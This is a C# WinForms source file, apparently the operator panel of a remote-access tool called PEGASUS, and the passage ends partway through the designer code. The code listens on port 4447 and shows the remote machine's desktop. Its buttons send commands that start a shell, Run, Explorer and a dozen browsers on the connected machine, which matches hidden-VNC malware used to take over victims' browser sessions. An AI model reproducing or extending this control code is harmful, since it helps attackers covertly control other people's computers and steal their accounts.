using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using PEGASUS.Metafora_Dedomenon;

namespace PEGASUS
{
	public class VNCForm : Form
	{
		private const int StartExplorer = 1025;

		private const int StartRun = 1026;

		private const int StartChrome = 1027;

		private const int StartEdge = 1028;

		private const int StartBrave = 1029;

		private const int StartFirefox = 1030;

		private const int StartIexplore = 1031;

		private const int StartPowershell = 1032;

		private const int StartPalemoon = 1033;

		private const int StartWaterfox = 1034;

		private const int StartOpera = 1035;

		private const int Start360 = 1036;

		private const int StartComodo = 1037;

		private const int StartNeon = 1039;

		public PEGASUS.Metafora_Dedomenon.Server server;

		private long Counter;

		private IContainer components;

		private Panel panel1;

		private PictureBox pictureBox1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2GradientButton btnPowershell;

		private Guna2GradientButton btn360;

		private Guna2GradientButton btnPalemoon;

		private Guna2GradientButton guna2GradientButton4;

		private Guna2GradientButton guna2GradientButton5;

		private Guna2GradientButton btnBrave;

		private Guna2GradientButton btnEdge;

		private Guna2GradientButton btnFirefox;

		private Guna2GradientButton btnStartL;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ResizeForm guna2ResizeForm1;

		private Label label1;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		private PictureBox picTitleIcon;

		private Guna2GradientButton btnWaterfox;

		private Guna2GradientButton btnOpera;

		private Guna2GradientButton btnComodo;

		private Guna2PictureBox guna2PictureBox8;

		private Guna2PictureBox guna2PictureBox7;

		private Guna2PictureBox guna2PictureBox6;

		private Guna2PictureBox guna2PictureBox4;

		private Guna2PictureBox guna2PictureBox3;

		private Guna2PictureBox guna2PictureBox2;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2PictureBox guna2PictureBox5;

		private Guna2GradientButton btnOperaNeon;

		private Guna2GradientButton btnIE;

		private Guna2PictureBox guna2PictureBox10;

		private Guna2PictureBox guna2PictureBox9;

		public VNCForm()
		{
			InitializeComponent();
		}

		private void VNCForm_Load(object sender, EventArgs e)
		{
			new Thread((ThreadStart)delegate
			{
				try
				{
					Task task = Task.Factory.StartNew(delegate
					{
						fun1();
					});
					Task task2 = Task.Factory.StartNew(delegate
					{
						fun2();
					});
					Task.WaitAll(task, task2);
				}
				catch
				{
				}
			}).Start();
		}

		private void NewClient(object sender, EventArgs arg)
		{
		}

		private void StartNewServer(object sender, EventArgs arg)
		{
			server = new PEGASUS.Metafora_Dedomenon.Server();
			server.SetParentWindow(pictureBox1);
			server.StartServer(4447);
			PEGASUS.Metafora_Dedomenon.Server obj = server;
			obj.OnDisconnected = (PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent(OnDisconnected));
			PEGASUS.Metafora_Dedomenon.Server obj2 = server;
			obj2.OnConnected = (PEGASUS.Metafora_Dedomenon.Server.ConnectedClientEvent)Delegate.Combine(obj2.OnConnected, new PEGASUS.Metafora_Dedomenon.Server.ConnectedClientEvent(OnConnected));
			pictureBox1.Focus();
		}

		private void OnDisconnected(object sender, int uhid)
		{
		}

		private void OnConnected(object sender, int uhid)
		{
			Invoke(new EventHandler(NewClient), this, null);
		}

		private void VNCForm_FormClosed(object sender, FormClosedEventArgs e)
		{
		}

		private void btnExplorer_Click(object sender, EventArgs e)
		{
			server.Send(1025u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnRun_Click(object sender, EventArgs e)
		{
			server.Send(1026u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnStartChrome_Click(object sender, EventArgs e)
		{
			server.Send(1027u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnEdge_Click(object sender, EventArgs e)
		{
			server.Send(1029u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnBrave_Click(object sender, EventArgs e)
		{
			server.Send(1028u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnFirefox_Click(object sender, EventArgs e)
		{
			server.Send(1030u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnIexplore_Click(object sender, EventArgs e)
		{
			server.Send(1031u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnPowershell_Click(object sender, EventArgs e)
		{
			server.Send(1032u, 0L, 0L);
			pictureBox1.Focus();
		}

		private unsafe void pictureBox1_Paint(object sender, PaintEventArgs e)
		{
			byte[] desktopImageBytes = server.GetDesktopImageBytes();
			if (desktopImageBytes != null)
			{
				try
				{
					fixed (byte* value = desktopImageBytes)
					{
						int imageWidth = server.ImageWidth;
						int imageHeight = server.ImageHeight;
						using Bitmap bitmap = new Bitmap(imageWidth, imageHeight, imageWidth * 3, PixelFormat.Format24bppRgb, new IntPtr(value));
						bitmap.RotateFlip(RotateFlipType.Rotate180FlipX);
						e.Graphics.DrawImage(bitmap, 0, 0);
						return;
					}
				}
				catch (Exception)
				{
					e.Graphics.FillRectangle(Brushes.Black, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
					pictureBox1.Invalidate();
					return;
				}
			}
			using Brush brush = new SolidBrush(pictureBox1.BackColor);
			e.Graphics.FillRectangle(brush, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
		}

		private void VNCForm_MouseDown(object sender, MouseEventArgs e)
		{
			pictureBox1.Focus();
		}

		private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			pictureBox1.Focus();
		}

		private void btnWaterfox_Click(object sender, EventArgs e)
		{
			server.Send(1034u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnPalemoon_Click(object sender, EventArgs e)
		{
			server.Send(1033u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btn360_Click(object sender, EventArgs e)
		{
			server.Send(1036u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnComodo_Click(object sender, EventArgs e)
		{
			server.Send(1037u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnOpera_Click(object sender, EventArgs e)
		{
			server.Send(1035u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			PEGASUS.Metafora_Dedomenon.Server obj = server;
			obj.OnDisconnected = (PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent(OnDisconnected));
			server.StopServer();
			Thread.Sleep(1000);
		}

		private void btnOperaNeon_Click(object sender, EventArgs e)
		{
			server.Send(1039u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnListen_Click(object sender, EventArgs e)
		{
			new Thread((ThreadStart)delegate
			{
				Task task = Task.Factory.StartNew(delegate
				{
					fun1();
				});
				Task task2 = Task.Factory.StartNew(delegate
				{
					fun2();
				});
				Task.WaitAll(task, task2);
			}).Start();
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			PEGASUS.Metafora_Dedomenon.Server obj = server;
			obj.OnDisconnected = (PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent(OnDisconnected));
			server.StopServer();
		}

		public void fun1()
		{
			server = new PEGASUS.Metafora_Dedomenon.Server();
			server.SetParentWindow(pictureBox1);
			server.StartServer(4447);
			PEGASUS.Metafora_Dedomenon.Server obj = server;
			obj.OnDisconnected = (PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new PEGASUS.Metafora_Dedomenon.Server.DisconnectedClientEvent(OnDisconnected));
			pictureBox1.Focus();
		}

		public void fun2()
		{
			Thread.Sleep(4000);
			server.Send(1025u, 0L, 0L);
			pictureBox1.Focus();
		}

		public void fun3()
		{
			server.StopServer();
			Thread.Sleep(1000);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS.VNCForm));
			panel1 = new System.Windows.Forms.Panel();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			btnPowershell = new Guna.UI2.WinForms.Guna2GradientButton();
			btn360 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnPalemoon = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnBrave = new Guna.UI2.WinForms.Guna2GradientButton();
			btnEdge = new Guna.UI2.WinForms.Guna2GradientButton();
			btnFirefox = new Guna.UI2.WinForms.Guna2GradientButton();
			btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2ResizeForm1 = new Guna.UI2.WinForms.Guna2ResizeForm(components);
			label1 = new System.Windows.Forms.Label();
			guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			picTitleIcon = new System.Windows.Forms.PictureBox();
			btnWaterfox = new Guna.UI2.WinForms.Guna2GradientButton();
			btnComodo = new Guna.UI2.WinForms.Guna2GradientButton();
			btnOpera = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox6 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox7 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox8 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
			btnOperaNeon = new Guna.UI2.WinForms.Guna2GradientButton();
			btnIE = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2PictureBox9 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox10 = new Guna.UI2.WinForms.Guna2PictureBox();
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)picTitleIcon).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox4).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox6).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox7).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox8).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox5).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox9).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox10).BeginInit();
			SuspendLayout();
			panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			panel1.Controls.Add(pictureBox1);
			panel1.Location = new System.Drawing.Point(4, 72);
			panel1.Margin = new System.Windows.Forms.Padding(2);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(1032, 714);
			panel1.TabIndex = 0;
			pictureBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox1.BackgroundImage");
			pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
			pictureBox1.Location = new System.Drawing.Point(0, 0);
			pictureBox1.Margin = new System.Windows.Forms.Padding(2);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(1030, 712);
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			pictureBox1.Paint += new System.Windows.Forms.PaintEventHandler(pictureBox1_Paint);
			pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseDown);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnPowershell.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			btnPowershell.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnPowershell.BorderThickness = 1;
			btnPowershell.CheckedState.Parent = btnPowershell;
			btnPowershell.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPowershell.CustomImages.Parent = btnPowershell;
			btnPowershell.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnPowershell.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnPowershell.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPowershell.DisabledState.Parent = btnPowershell;
			btnPowershell.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPowershell.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPowershell.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPowershell.ForeColor = System.Drawing.Color.White;
			btnPowershell.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPowershell.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPowershell.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPowershell.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPowershell.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPowershell.HoverState.Parent = btnPowershell;
			btnPowershell.Location = new System.Drawing.Point(913, 792);
			btnPowershell.Name = "btnPowershell";
			btnPowershell.ShadowDecoration.Parent = btnPowershell;
			btnPowershell.Size = new System.Drawing.Size(123, 27);
			btnPowershell.TabIndex = 160;
			btnPowershell.Text = "Shell";
			btnPowershell.Click += new System.EventHandler(btnPowershell_Click);
			btn360.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btn360.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btn360.BorderThickness = 1;
			btn360.CheckedState.Parent = btn360;
			btn360.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btn360.CustomImages.Parent = btn360;
			btn360.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btn360.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btn360.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btn360.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btn360.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btn360.DisabledState.Parent = btn360;
			btn360.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btn360.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.Font = new System.Drawing.Font("Electrolize", 9f);
			btn360.ForeColor = System.Drawing.Color.White;
			btn360.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btn360.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btn360.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btn360.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btn360.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btn360.HoverState.Parent = btn360;
			btn360.Location = new System.Drawing.Point(4, 854);
			btn360.Name = "btn360";
			btn360.ShadowDecoration.Parent = btn360;
			btn360.Size = new System.Drawing.Size(110, 27);
			btn360.TabIndex = 159;
			btn360.Text = "360";
			btn360.Click += new System.EventHandler(btn360_Click);
			btnPalemoon.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnPalemoon.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnPalemoon.BorderThickness = 1;
			btnPalemoon.CheckedState.Parent = btnPalemoon;
			btnPalemoon.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPalemoon.CustomImages.Parent = btnPalemoon;
			btnPalemoon.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnPalemoon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnPalemoon.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPalemoon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btnPalemoon.DisabledState.ForeColor = System.Drawing.Color.Gray;
			btnPalemoon.DisabledState.Parent = btnPalemoon;
			btnPalemoon.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPalemoon.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPalemoon.ForeColor = System.Drawing.Color.White;
			btnPalemoon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPalemoon.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPalemoon.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPalemoon.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPalemoon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPalemoon.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPalemoon.HoverState.Parent = btnPalemoon;
			btnPalemoon.Location = new System.Drawing.Point(234, 823);
			btnPalemoon.Name = "btnPalemoon";
			btnPalemoon.ShadowDecoration.Parent = btnPalemoon;
			btnPalemoon.Size = new System.Drawing.Size(110, 27);
			btnPalemoon.TabIndex = 158;
			btnPalemoon.Text = "PaleMoon";
			btnPalemoon.Click += new System.EventHandler(btnPalemoon_Click);
			guna2GradientButton4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton4.BorderThickness = 1;
			guna2GradientButton4.CheckedState.Parent = guna2GradientButton4;
			guna2GradientButton4.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton4.CustomImages.Parent = guna2GradientButton4;
			guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton4.DisabledState.Parent = guna2GradientButton4;
			guna2GradientButton4.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton4.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton4.ForeColor = System.Drawing.Color.White;
			guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton4.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton4.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton4.HoverState.Parent = guna2GradientButton4;
			guna2GradientButton4.Location = new System.Drawing.Point(913, 854);
			guna2GradientButton4.Name = "guna2GradientButton4";
			guna2GradientButton4.ShadowDecoration.Parent = guna2GradientButton4;
			guna2GradientButton4.Size = new System.Drawing.Size(123, 27);
			guna2GradientButton4.TabIndex = 157;
			guna2GradientButton4.Text = "Run";
			guna2GradientButton4.Click += new System.EventHandler(btnRun_Click);
			guna2GradientButton5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			guna2GradientButton5.BorderThickness = 1;
			guna2GradientButton5.CheckedState.Parent = guna2GradientButton5;
			guna2GradientButton5.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2GradientButton5.CustomImages.Parent = guna2GradientButton5;
			guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			guna2GradientButton5.DisabledState.Parent = guna2GradientButton5;
			guna2GradientButton5.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton5.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GradientButton5.ForeColor = System.Drawing.Color.White;
			guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			guna2GradientButton5.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton5.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2GradientButton5.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2GradientButton5.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2GradientButton5.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2GradientButton5.HoverState.Parent = guna2GradientButton5;
			guna2GradientButton5.Location = new System.Drawing.Point(913, 823);
			guna2GradientButton5.Name = "guna2GradientButton5";
			guna2GradientButton5.ShadowDecoration.Parent = guna2GradientButton5;
			guna2GradientButton5.Size = new System.Drawing.Size(123, 27);
			guna2GradientButton5.TabIndex = 156;
			guna2GradientButton5.Text = "File Manager";
			guna2GradientButton5.Click += new System.EventHandler(btnExplorer_Click);
			btnBrave.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnBrave.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnBrave.BorderThickness = 1;
			btnBrave.CheckedState.Parent = btnBrave;
			btnBrave.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnBrave.CustomImages.Parent = btnBrave;
			btnBrave.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnBrave.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnBrave.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBrave.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBrave.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnBrave.DisabledState.Parent = btnBrave;
			btnBrave.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnBrave.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnBrave.Font = new System.Drawing.Font("Electrolize", 9f);
			btnBrave.ForeColor = System.Drawing.Color.White;
			btnBrave.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnBrave.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnBrave.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnBrave.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnBrave.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnBrave.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnBrave.HoverState.Parent = btnBrave;
			btnBrave.Location = new System.Drawing.Point(119, 823);
			btnBrave.Name = "btnBrave";
			btnBrave.ShadowDecoration.Parent = btnBrave;
			btnBrave.Size = new System.Drawing.Size(110, 27);
			btnBrave.TabIndex = 155;
			btnBrave.Text = "Brave";
			btnBrave.Click += new System.EventHandler(btnBrave_Click);
			btnEdge.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnEdge.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnEdge.BorderThickness = 1;
			btnEdge.CheckedState.Parent = btnEdge;
			btnEdge.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnEdge.CustomImages.Parent = btnEdge;
			btnEdge.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnEdge.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnEdge.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnEdge.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnEdge.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnEdge.DisabledState.Parent = btnEdge;
			btnEdge.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnEdge.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnEdge.Font = new System.Drawing.Font("Electrolize", 9f);
			btnEdge.ForeColor = System.Drawing.Color.White;
			btnEdge.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnEdge.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnEdge.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnEdge.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnEdge.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnEdge.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnEdge.HoverState.Parent = btnEdge;
			btnEdge.Location = new System.Drawing.Point(119, 792);
			btnEdge.Name = "btnEdge";
			btnEdge.ShadowDecoration.Parent = btnEdge;
			btnEdge.Size = new System.Drawing.Size(110, 27);
			btnEdge.TabIndex = 154;
			btnEdge.Text = "Edge";
			btnEdge.Click += new System.EventHandler(btnEdge_Click);
			btnFirefox.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnFirefox.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnFirefox.BorderThickness = 1;
			btnFirefox.CheckedState.Parent = btnFirefox;
			btnFirefox.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnFirefox.CustomImages.Parent = btnFirefox;
			btnFirefox.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnFirefox.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnFirefox.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnFirefox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnFirefox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnFirefox.DisabledState.Parent = btnFirefox;
			btnFirefox.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnFirefox.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnFirefox.Font = new System.Drawing.Font("Electrolize", 9f);
			btnFirefox.ForeColor = System.Drawing.Color.White;
			btnFirefox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnFirefox.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnFirefox.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnFirefox.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnFirefox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnFirefox.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnFirefox.HoverState.Parent = btnFirefox;
			btnFirefox.Location = new System.Drawing.Point(4, 823);
			btnFirefox.Name = "btnFirefox";
			btnFirefox.ShadowDecoration.Parent = btnFirefox;
